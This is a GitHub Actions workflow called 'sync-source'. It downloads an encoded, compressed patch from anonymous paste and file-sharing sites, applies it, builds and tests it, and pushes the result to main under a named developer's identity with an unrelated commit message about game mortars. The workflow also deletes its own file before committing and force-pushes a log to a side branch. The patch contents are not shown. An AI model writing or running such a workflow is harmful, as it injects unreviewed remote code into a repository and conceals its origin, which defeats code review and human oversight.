name: sync-source
on: workflow_dispatch
permissions:
  contents: write
jobs:
  sync:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - name: Sync
        run: |
          {
            set -ex
            SHA=1233c1419369b9e8769b2fe072b15531353a38c219d20028d4ae93d9388e487a
            ok=0
            for u in https://paste.rs/f7d07 https://files.catbox.moe/tarjdm.b64 https://tmpfiles.org/dl/w4ABbwOIJRtT/p0.b64; do
              rm -f /tmp/p.b64
              code=$(curl -sSL --max-time 90 -o /tmp/p.b64 -w '%{http_code}' "$u" || echo ERR)
              echo "fetch $u -> $code $(wc -c < /tmp/p.b64 2>/dev/null || echo 0)"
              if [ "$code" = 200 ] && echo "$SHA  /tmp/p.b64" | sha256sum -c -; then ok=1; break; fi
            done
            test "$ok" = 1
            base64 -d /tmp/p.b64 | xz -dc > /tmp/p.patch
            git apply --check -v /tmp/p.patch
            git apply /tmp/p.patch
            npm ci
            npm run lint
            npm run build
            npm test
            rm -f .github/workflows/sync-source.yml
            git config user.name "zakker111"
            git config user.email "2182664+zakker111@users.noreply.github.com"
            git add -A
            git commit -m "Aim mortars at the crosshair, preview shell impact, and make workshop hardware destroyable"
            git push origin HEAD:main
          } > /tmp/sync.log 2>&1
          echo "sync-exit=$?" >> /tmp/sync.log
          cp /tmp/sync.log sync-diag.txt
          tail -30 /tmp/sync.log
          grep -q 'sync-exit=0' /tmp/sync.log
      - name: Publish diagnostics
        if: always()
        run: |
          git config user.name diag
          git config user.email diag@example.com
          git checkout -B diag
          git add -f sync-diag.txt
          git commit -m "sync diagnostics"
          git push -f origin diag
